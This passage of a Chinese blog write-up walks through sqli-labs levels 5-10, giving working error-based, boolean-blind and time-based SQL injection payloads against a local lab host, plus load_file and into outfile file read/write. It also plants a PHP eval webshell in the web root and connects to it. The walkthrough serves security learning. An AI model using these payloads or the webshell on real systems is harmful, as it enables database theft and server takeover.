information_schema.schemata;</code></p><p>information_schema.schemata表中有八组数据，这个表达式会为这八组数据产生八个随机的结果。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image47.png" alt="image47"></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image48.png" alt="image48"></p><p>接下来分析一下concat函数</p><p><strong>0x3a是字符:的ascii码</strong>，这里concat函数是将字符串拼接起来的，因此我们这里用0x3a来分割字符串。</p><p><code>select concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2));</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image49.png" alt="image49"></p><p>更改一下名字</p><p><code>select concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) as a;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image50.png" alt="image50"></p><p>也可以省去as</p><p><code>select concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image51.png" alt="image51"></p><p>​    最后我们再来理解这段查询语句</p><p><code>Select 1,count(*),concat(0x3a,0x3a,(select user(),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a</code></p><p>我们先查询information_schema.columns中所有记录的floor(rand(0)*2)值，会有1605个，我们只显示前100条。</p><p><code>select floor(rand(0)*2) from information_schema.columns limit 0,100;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image52.png" alt="image52"></p><p>然后执行查询语句，红圈处报错，显示位为::root@localhost::1</p><p><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image53.png" alt="image53"></p><p>接着一步一步分析，查询语句中的group by是对information_schema.tables中的所有数据来按照a来进行查询，在查询前会默认建立一张空的虚拟表。整个过程有两个操作，查询和插入，这个rand()函数在查询和插入的时候会分别执行一次。在如下图所示，是建立的一个空的虚拟表（<strong>注：key值唯一</strong>）</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image54.png" alt="image54"></p><p>取第一条数据，查询执行concat(0x3a,0x3a,(select user(),0x3a,0x3a,floor(rand(0)*2))为::root@localhost::0，对应的key值里面没有，于是插入到表中，插入的时候会第二次执行concat(0x3a,0x3a,(select user(),0x3a,0x3a,floor(rand(0)*2))为::root@localhost::1，同时count(*)加一，就是下表</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image55.png" alt="image55"></p><p>接着查询，第三次执行concat(0x3a,0x3a,(select user(),0x3a,0x3a,floor(rand(0)*2))为::root@localhost::1，对应的key值已经存在，那么就直接count(*)加一，为下表</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image56.png" alt="image56"></p><p>接着查询，第四次执行concat(0x3a,0x3a,(select user(),0x3a,0x3a,floor(rand(0)*2))为::root@localhost::0，对应的key值没有，于是插入到表中，插入的时候会第二次执行concat(0x3a,0x3a,(select user(),0x3a,0x3a,floor(rand(0)*2))为::root@localhost::1，插入后发现之前的key值已经存在::root@localhost::1，于是就报错了。这个concat就是为了将数据在报错的时候显示出来。</p><p><strong>我们的目的就是为了获得user()信息，后面的information_schema.columns这个表随便取，我们如果想获得其他信息，就可以把user()换成其他信息，比如database()和version()什么的。</strong></p><p>所以只要在前面的几次执行，虚拟表中两个数据都存在后，后面就不会再执行插入操作，就不会再报错了。具体参考<a href="https://www.bilibili.com/video/BV1Xt41157ti?from=search&amp;seid=12116591912146000210&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1Xt41157ti?from=search&amp;seid=12116591912146000210&amp;spm_id_from=333.337.0.0</a></p><p><strong>2.exp报错</strong></p><p>不建议使用，对版本要求太高</p><p><code>select exp(~(select * FROM(SELECT USER())a));</code></p><p><strong>3.updatexml报错</strong></p><p>用法介绍：</p><p><code>updatexml(XML_document, XPath_string, new_value);</code></p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc。第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值</p><p>需要注意的是XPATH语法报错的是那些特殊字符，遇到特殊字符会报错，所以选择了ascii码为<code>0x7e</code>的字符~。</p><p>另外，<code>updatexml</code>最多只能显示32位，需要配合<code>SUBSTR</code>或者<code>reserve</code>使用。</p><p><strong>举例：</strong></p><p><code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image57.png" alt="image57"></p><p>如果数据库名过长，使用substr()</p><p><code>select updatexml(1,concat(0x7e,(substr((select database()),1,5)),0x7e),1);</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image58.png" alt="image58"></p><p><code>select updatexml(1,concat(0x7e,(substr((select database()),5,12)),0x7e),1);</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image59.png" alt="image59"></p><p><code>select updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1);</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image60.png" alt="image60"></p><p>在注入时的用法：</p><p><code>1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1);</code></p><h3 id="3-基于时间的SQL盲注——延时注入"><a href="#3-基于时间的SQL盲注——延时注入" class="headerlink" title="(3).基于时间的SQL盲注——延时注入"></a>(3).基于时间的SQL盲注——延时注入</h3><p>延时注入常用的函数有sleep()和benchmark()</p><p>在此之前先引入一个新的概念if语句</p><p><strong>if语句</strong></p><p>用法介绍：if(expr1,expr2,expr3)</p><p>意思是如果expr1的结果为true，则执行expr2，反之执行expr3</p><p><code>select if((database()=&#39;security&#39;),1,sleep(4));</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image61.png" alt="image61"></p><p><code>select if((database()=&#39;security&#39;),sleep(4),0);</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image81.png" alt="image81"></p><p><strong>sleep(duration)</strong></p><p>参数duration是指休眠的时长，以秒为单位，duration可以是整数也可以是小数。</p><p>休眠四秒后获得结果</p><p><code>select sleep(4);</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image62.png" alt="image62"></p><p>在正确的情况下，休眠2秒后获得结果</p><p><code>select sleep(2),database();</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image63.png" alt="image63"></p><p>报错的情况下则不延迟</p><p><code>select sleep(2),datbase();</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image64.png" alt="image64"></p><p>上述分析可得，我们可以通过延迟来判断payload是否能正确注入</p><p>用例介绍：一般配合<code>ascii()</code>、<code>ord()</code>和<code>if</code>语句使用</p><p><code>1&#39; and sleep(5) # //判断注入类型</code></p><p><code>1&#39; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1) # //猜数据库的名称</code></p><p><code>1&#39; and if((select count(table_name) from information_schema.tables where table_schema=database())=1,sleep(5),1) # //猜数据库中表的数量</code></p><p><strong>benchmark(count,expr)</strong></p><p>count参数代表的是执行的次数，expr参数代表的是执行的表达式</p><p><code>select benchmark(6,sleep(1));</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image65.png" alt="image65"></p><p>一般在注入中，也是配合<code>if</code>语句和其他函数使用</p><p>举例：</p><p>猜数据库名称长度（0x41是A的ascii值）</p><p><code>select if(length(database())=6,(select benchmark(10000000,md5(0x41))),0);</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image66.png" alt="image66"></p><p><code>select if(length(database())=8,(select benchmark(10000000,md5(0x41))),0);</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image67.png" alt="image67"></p><p>可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执<br>行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源，推荐使用sleep()。</p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>从这关的源码中我们也可以得知不会返回数据库当中的信息了。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20211123191251670.png" alt="image-20211123191251670"></p><p>在?id=1后面随便输入都不行</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image68.png" alt="image68"></p><p><strong>1.使用left(database(),1)尝试</strong></p><p><strong>(1).猜测数据库版本号</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and left(version(),1)=5--+</code></p><p>这里语句的意思是看版本号的第一位是不是5，从返回结果没报错我们知道是对的。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image69.png" alt="image69"></p><p>如果判断错误就会报错</p><p><code>http://192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and left(version(),1)=6--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image70.png" alt="image70"></p><p><strong>(2).猜测数据库的长度</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and length(database())=8--+</code></p><p>这里语句是判断数据库长度是否为8，同样的如果不是8就会报错</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image71.png" alt="image71"></p><p><strong>(3).猜测数据库的第一位</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and left(database(),1)&gt;&#39;a--+</code></p><p>这里是判断第一位是否&gt;a，很明显s&gt;a，因此返回正确。当我们不知情的情况下可以用二分法来提高注入的效率。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image72.png" alt="image72"></p><p><strong>(4).猜测数据库的第二位</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and left(database(),2)&gt;&#39;sa&#39;--+</code></p><p>我们在知道第一位是s后，判断前两位是否&gt;sa</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image73.png" alt="image73"></p><p><strong>2.利用substr() ascii()函数进行尝试</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80--+</code></p><p>这里是判断security数据库的第一个表的第一个字符的ascii值是否大于p的ascii值80，这里的table_schema可以写成’security’。同样的，如果不满足就会报错。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image74.png" alt="image74"></p><p>如果想获取第一个表即security表的第二个字符，我们只需要将<code>substr(*,1,1)</code>改为<code>substr(*,2,1)</code>即可。</p><p>如果想获得第二个表，我们只需要将<code>limit 0,1</code>改为<code>limit 1,1</code>即可。</p><p><strong>3.利用regexp获取user表中的列</strong></p><p><code>192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and 1=(select 1 from information_schema.columns where column_name = &#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)--+</code></p><p>表示选择users表中的列名开头是否有us的列</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image75.png" alt="image75"></p><p><code>192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and 1=(select 1 from information_schema.columns where column_name = &#39;users&#39; and table_name regexp &#39;^username&#39; limit 0,1)--+</code></p><p>这里是查询user表中是否有username这个列，显然存在</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image76.png" alt="image76"></p><p>同样的，username换成password也成立。</p><p><strong>4.利用ord()和mid()函数获取users表中的内容</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+</code></p><p>获取users表中的第一行的第一个字符的ascii，与68（即D）进行比较。而我们从源码中知道第一行的数据为Dumb。后面的类似。</p><p>到此sql布尔盲注演示完毕，接下来就是报错注入和延时注入。</p><p><strong>5.报错注入</strong></p><p><strong>(1).floor报错</strong></p><p><code>192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image77.png" alt="image77"></p><p><strong>(2).double数值类型超出范围报错</strong></p><p>此处待更</p><p><strong>6.延时注入</strong></p><p><strong>(1).利用sleep()函数进行注入</strong></p><p><code>192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image78.png" alt="image78"></p><p>错误的话会有5秒的时间延时，然后报错</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image79.png" alt="image79"></p><p><strong>(2).利用benchmark()函数进行注入</strong></p><p><code>192.168.176.133/sqli-labs-master/Less-5/?id=1&#39; union select (if(substring(current,1,1)=char(115),benchmark(50000000,encode(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 from (select database() as current) as tb1--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image80.png" alt="image80"></p><p>结果正确的时候，运行ENCODE(‘MSG’,’by5seconds’)操作50000000次，会占用一段时间。</p><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-6</strong></h2><p>我们可以查看源码，其实这关与第五关的区别就是可以注入的id的单引号变为了双引号，我们只需要在第五关的基础上将单引号改为双引号即可。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image82.png" alt="image82"></p><p><code>http://192.168.176.133/sqli-labs-master/Less-6/?id=1&quot; and left(version(),1)=5--+</code></p><p>同样的查看版本号第一位</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image83.png" alt="image83"></p><p>后面的不再赘述。</p><h2 id="补充——导入导出相关操作的讲解"><a href="#补充——导入导出相关操作的讲解" class="headerlink" title="补充——导入导出相关操作的讲解"></a>补充——导入导出相关操作的讲解</h2><h3 id="1-load-file-导出文件"><a href="#1-load-file-导出文件" class="headerlink" title="1.load_file()导出文件"></a>1.load_file()导出文件</h3><p>**Load_file(file_name):**读取文件并返回该文件的内容作为一个字符串。</p><p>使用条件：</p><p>(1).必须有权限读取并且文件必须完全可读</p><p>and (select count(*) from mysql.user)&gt;0 //如果结果返回正常，说明具有读写权限</p><p>and (select count(*) from mysql.user)&gt;0 //如果返回错误，应该是管理员给数据库账户降权</p><p>(2).想要读取文件必须在服务器上</p><p>(3).必须指定文件完整的路径</p><p>(4).想要读取文件必须小于max_allowed_packet</p><p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows下，如果NFTS设置得当，是不能读取相关的文件的，当遇到只有administrators才能访问的文件，users就别想load_file出来。</p><p>在实际的注入中，我们有两个难点需要解决：</p><p>(1).绝对物理路径</p><p>(2).构造有效的畸形语句（报错爆出绝对路径）</p><p>在很多php程序中，当提交一个错误的Query，如果display_erroes=on，程序就会暴露WEB目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。</p><p><strong>示例：</strong></p><p><code>select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</code></p><p>利用hex()将文件内容导出来，尤其是smb文件时可使用。</p><p><code>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</code></p><p>这里<code>char(99,58,47,98,111,111,116,46,105,110,105)</code>其实就是”c:/boot.ini”的ascii码。</p><p><code>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</code></p><p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”。</p><p><code>-1 union select 1,1,1,load_file(c:\\boot.ini)</code></p><p>路径里的/可以用\\代替</p><p><strong>举例：</strong></p><p><code>select load_file(&#39;C:\\phpStudy\\PHPTutorial\WWW\\sqli-labs-master\\test.php&#39;)</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image84.png" alt="image84"></p><h3 id="2-文件导入到数据库"><a href="#2-文件导入到数据库" class="headerlink" title="2.文件导入到数据库"></a>2.文件导入到数据库</h3><p>LOAD DATA INFILE语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image85.png" alt="image85"></p><p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。</p><p><strong>示例：</strong></p><p><code>load data infile &#39;/tmp/t0.txt&#39; ignore into table t0 character set gbk fields terminated by &#39;\t&#39; lines terminated by &#39;\n&#39;</code></p><p>将/tmp/t0.txt导入到t0表中，character set gbk是字符集设置为gbk，fields terminated by是每一行数据之间的分隔符，lines terminated by是行的结尾符。</p><p>当错误代码是2的时候，文件不存在；错误代码是13的时候是没有权限，可以考虑/tmp等文件夹。</p><h3 id="3-导入到文件"><a href="#3-导入到文件" class="headerlink" title="3.导入到文件"></a>3.导入到文件</h3><p><code>select ... into outfile &#39;file_name&#39;</code></p><p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此你必须拥有file权限才能使用此语法。file_name不能是一个已经存在的文件。</p><p>我们一般有两种利用形式：</p><p>(1).第一种直接将select内容导入到文件中；</p><p><code>select version() into outfile &#39;c:\\phpnow\\htdocs\\test.php&#39;</code></p><p>此处将version()替换成一句话，<code>&lt;?php @eval($_post[&quot;mima&quot;])?&gt;</code>也即</p><p><code>select &lt;?php @eval($_post[&quot;mima&quot;])?&gt; into outfile &quot;c:\\phpnow\\htdocs\\test.php&quot;</code></p><p>一句话木马连接。</p><p>(2).第二种修改文件结尾</p><p><code>select version() into outfile &quot;c:\\phpnow\\htdocs\\test.php&quot; lines terminated by 0x16 进制文件</code></p><p>解释：通常是用’\t\n’结尾，此处我们修改为自己想要的任何文件。同时可以用fields terminated by </p><p>16进制可以为一句话或者其他任何的代码，可自行构造。（<strong>注：在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：</strong><a href="http://www.cnblogs.com/lcamry/p/5505110.html%EF%BC%89">http://www.cnblogs.com/lcamry/p/5505110.html）</a></p><p><strong>注：</strong></p><p>(1）可能在文件路径当中要注意转义，这个要看具体的环境<br>(2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语<br>句：</p><p><code>select load_file(&quot;C:\\phpStudy\\PHPTutorial\\MySQL\\my.ini&quot;) into outfile &#39;C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\test.php&#39;;</code></p><p><strong>前提是那个test.php不存在</strong></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image86.png" alt="image86"></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image87.png" alt="image87"></p><p>可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。<br>上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，<br>这个要平时积累。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>可以查看源码</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image88.png" alt="image88"></p><p>从对id的处理中我们发现可以用’)) and 1=1来进行注入</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image89.png" alt="image89"></p><p>这里演示文件导入的方式</p><p><code>192.168.176.133/sqli-labs-master/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &quot;C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.txt&quot;--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image90.png" alt="image90"></p><p>显示报错并且在目录中也找不到test.txt文件</p><p>进入命令行执行 <code>show variables like &#39;%secure%&#39;;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image91.png" alt="image91"></p><p>当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。</p><p>我们进到mysql安装目录下的my.ini文件，在[mysqld]下添加<code>secure_file_priv= &#39;&#39;</code>保存退出，然后重启mysql，再次执行<code>show variables like &#39;%secure%&#39;;</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image92.png" alt="image92"></p><p>此时就能导入导出数据了，再次进行文件导入</p><p><code>192.168.176.133/sqli-labs-master/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &quot;C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.txt&quot;--+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image93.png" alt="image93"></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image94.png" alt="image94"></p><p>文件导入成功！</p><p>通过这个漏洞，我们可以将一句话木马导入进去</p><p><code>192.168.176.133/sqli-labs-master/Less-7/?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;hello&quot;]); ?&gt;&#39; into outfile &#39;C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php&#39; --+</code></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image95.png" alt="image95"></p><p>利用菜刀进行连接</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image96.png" alt="image96"></p><p>get!</p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>首先进行测试，在?id=1后面随便输入，发现没变化</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image97.png" alt="image97"></p><p>换成加’ and 1=2–+发现界面显示有变化，接下来就可以注入了</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image98.png" alt="image98"></p><p>我们可以查看源码得知这里的报错被z注释掉了，因此无法通过报错注入</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image99.png" alt="image99"></p><p>我们可以试一下<strong>floor报错</strong></p><p><code>192.168.176.133/sqli-labs-master/Less-8/?id=1&#39; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information schema.columns group by a--+</code></p><p>按理说应该同<strong>Less-6</strong>一样会爆出user()的，但这里没有</p><p>我们这里仿照<strong>Less-5</strong>来进行延时注入</p><p><code>192.168.176.133/sqli-labs-master/Less-8/?id=1&#39;and if(ascii(substr(database(),1,1))=115,1,sleep(100))--+</code></p><p>这里猜数据库的第一位是不是s，如果是的话直接执行，否则停留100秒。</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image100.png" alt="image100"></p><p>其他的类似<strong>Less-5</strong></p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>本关题目是基于时间-单引号，所以明显这关需要用延时注入，并且参数id带’’，因此我们还得闭合’。</p><p>利用sleep()来<strong>猜测数据库：</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-9/?id=1&#39; and if(ascii(substr(database(),1,1))==115,1,sleep(5))--+</code></p><p>没延时5秒，说明数据库第一位是s</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image101.png" alt="image101"></p><p>以此类推得到数据库名为<strong>security</strong></p><p><strong>猜security的表：</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-9/?id=1%27and%20if(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1))=101,1,sleep(5))--+</code></p><p>没延时5秒，说明第一个数据表的第一位是e，依次类推得到emails</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image102.png" alt="image102"></p><p><strong>猜emails表的列：</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-9/?id=1%27and%20if(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=%27emails%27%20limit%200,1),1,1))=105,1,sleep(5))--+</code></p><p>没延时5秒说明emails表的第一列的第一位是i，依次类推可以得到列名为<strong>id</strong>,<strong>email_id</strong></p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image103.png" alt="image103"></p><p><strong>猜测email_id的值：</strong></p><p><code>http://192.168.176.133/sqli-labs-master/Less-9/?id=1%27and%20if(ascii(substr((select%20email_id%20from%20emails%20limit%200,1)1,1))=68,1,sleep(5))--+</code></p><p>没延时5秒，说明email_id的第一个数据的第一位是D，依次类推就能得到所有数据的值</p><p><img src="/2021/11/22/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image104.png" alt="image104"></p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>从标题看到基于时间-双引号，我们知道第十关与第九关的区别就是单引号和双引号而已，参考第九关。</p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入，mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场pikachu</title>
